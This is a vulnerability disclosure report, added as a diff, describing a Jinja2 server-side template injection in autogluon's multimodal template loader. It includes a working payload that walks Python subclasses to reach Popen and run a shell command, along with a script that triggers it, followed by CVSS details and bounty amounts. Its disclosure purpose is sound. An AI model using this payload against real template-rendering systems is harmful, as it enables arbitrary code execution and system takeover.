@@ -1,0 +1,49 @@
+Title: Remote Code Execution due to jinja2 SSTI in autogluon/autogluon in autogluon/autogluon
+
+Proof of Concept: 
+In SSTI vulnerability, since we cannot directly invoke the desired method, we select a class from subclasses and carry out the attack through this class.
+
+Firstly we need find Popen class in subclasses.The following payload can be used for this.This will return the index number of the Popen class. To see its output, you will need to debug.All index numbers can be found by trial and error, we obtain the index number from the debug log only to facilitate the proof of concept steps
+
+!Template
+name: example_template
+jinja: "{{ ().__class__.__base__.__subclasses__()[380]('ls') }}"
+reference: "Example Reference or Author"
+metadata: 
+  domain: "General"
+  quality: "High"
+answer_choices: "A ||| B ||| C ||| D"
+
+// test_autogluon.py
+# pip install -U autogluon
+
+import yaml
+from autogluon.multimodal.data.templates import Template
+
+with open("templates.yaml", "r") as file:
+    template = yaml.safe_load(file)
+    template.apply({"col_name":"test"})
+
+Then run test_autogluon.py and you can see the results of executing the ls command
+
+Impact: 
+Allows the attacker to execute malicious code, gaining full control over the system.
+
+CVE ID: CVE-2024-5978
+Status: (assigned)
+Vulnerability Type: CWE-1336: Improper Neutralization of Special Elements Used in a Template Engine
+Severity: Medium (5.9)
+Attack Vector: Local
+Attack Complexity: Low
+Privileges Required: None
+User Interaction: None
+Scope: Unchanged
+Confidentiality: Low
+Integrity: Low
+Availability: Low
+Registry: Pypi
+Affected Version: autogluon.multimodal - All versions(Prior to version 1.1.0)
+Visibility: Public
+Status: Awaiting fix
+Disclosure Bounty: $125 to $150
+Fix Bounty: $31.25
